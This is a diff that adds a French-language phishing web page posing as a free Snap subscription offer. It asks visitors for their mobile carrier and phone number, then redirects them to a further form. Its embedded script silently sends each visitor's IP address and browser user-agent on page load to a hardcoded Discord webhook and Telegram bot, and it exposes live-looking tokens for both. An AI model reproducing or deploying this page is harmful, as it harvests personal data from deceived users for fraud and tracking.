@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<title>Snap + 1 ans gratuit 🎁</title>
+<style>
+  body {
+    background: #2c014d;
+    color: #fff;
+    font-family: sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .c {
+    background: rgba(44,1,77,0.85);
+    padding: 30px;
+    border-radius: 20px;
+    width: 360px;
+    text-align: center;
+    box-shadow: 0 0 15px #9b00ff;
+    border: 2px solid #a54ffb;
+  }
+  input, select, button {
+    width: 100%;
+    margin: 8px 0;
+    padding: 12px;
+    border: 2px solid #a54ffb;
+    border-radius: 10px;
+    background: transparent;
+    color: white;
+    font-size: 16px;
+    outline: none;
+    box-shadow: inset 0 0 8px #9b00ff;
+    transition: 0.3s;
+  }
+  input:focus, select:focus {
+    border-color: #f7b500;
+    box-shadow: 0 0 10px #f7b500;
+  }
+  button {
+    background: #f7b500;
+    color: #2c014d;
+    font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 0 10px #f7b500;
+    transition: 0.3s;
+  }
+  button:hover {
+    background: #e0a600;
+    box-shadow: 0 0 20px #ffcb3c;
+  }
+  #msg {
+    color: #f88;
+    margin-top: 15px;
+  }
+</style>
+</head>
+<body>
+<div class="c">
+  <h1>Étape 1 : Votre numéro 📞</h1>
+  <form id="form1">
+    <select name="operateur" required>
+      <option value="" disabled selected>Choisissez votre opérateur</option>
+      <option value="Orange">Orange</option>
+      <option value="SFR">SFR</option>
+      <option value="Free">Free</option>
+      <option value="Bouygues">Bouygues</option>
+    </select>
+    <input name="telephone" type="tel" placeholder="Numéro de téléphone" pattern="[0-9]{10}" required />
+    <button type="submit">Continuer</button>
+  </form>
+  <div id="msg"></div>
+</div>
+
+<script>
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
+  const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
+  const TELEGRAM_CHAT_ID = "-1002810249796";
+
+  async function getIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip || "IP inconnue";
+    } catch {
+      return "IP inconnue";
+    }
+  }
+
+  async function sendDiscord(embed) {
+    return fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  }
+
+  async function sendTelegram(text) {
+    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text,
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true
+      })
+    });
+  }
+
+  async function sendIpUaOnLoad() {
+    const ip = await getIP();
+    const ua = navigator.userAgent || "Inconnu";
+
+    const discordEmbed = {
+      title: "[🌐] PAGE OUVERTE [🌐]",
+      color: 0x9B00FF,
+      fields: [
+        { name: "🌐 Adresse IP", value: ip, inline: false },
+        { name: "🌐 User-Agent", value: ua, inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    };
+
+    const telegramText =
+      `[🌐] PAGE OUVERTE [🌐]\n\n` +
+      `🌐 Adresse IP : ${ip}\n` +
+      `🌐 User-Agent : ${ua}`;
+
+    await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
+  }
+
+  window.addEventListener('load', sendIpUaOnLoad);
+
+  document.getElementById("form1").addEventListener("submit", (e) => {
+    e.preventDefault();
+    localStorage.setItem("step1", JSON.stringify({
+      operateur: e.target.operateur.value,
+      telephone: e.target.telephone.value
+    }));
+
+    const msgEl = document.getElementById("msg");
+    msgEl.style.color = "#0f0";
+    msgEl.textContent = "Redirection...";
+
+    setTimeout(() => {
+      window.location.href = "formulaire.html";
+    }, 1000);
+  });
+</script>
+</body>
+</html>
